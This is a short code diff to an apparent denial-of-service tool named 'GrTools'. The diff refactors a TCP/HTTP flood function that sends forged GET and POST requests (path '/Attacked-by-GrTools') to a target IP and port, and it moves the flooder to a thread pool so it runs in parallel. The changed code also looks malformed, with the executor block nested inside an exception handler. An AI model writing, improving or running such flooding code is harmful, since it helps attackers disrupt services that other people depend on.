@@ -158,7 +158,7 @@ method = input("╔══\n╚══════>Server@GrTools~~ Enter Methods 
 
 if method == "TCP":
 
-    def tcpfl():
+    def tcpfl(ip, port):
         get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
         post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
         referer = "Referer: " + random.choice(https) + ip + "\r\n"
@@ -189,13 +189,11 @@ if method == "TCP":
                 sock.close()
             except Exception as e:
                 print("[!]Attacked")
-
-    threads = []
-    for _ in range(th):
+                
         if method == "TCP":
-            t = threading.Thread(target=tcpfl)
-            threads.append(t)
-            t.start()
+            with ThreadPoolExecutor(max_workers=th) as executor:
+                for _ in range(th):
+                    executor.submit(tcpfl, ip, port)
 
-    for thread in threads:
-        thread.join()
+if __name__ == "__main__":
+    main()
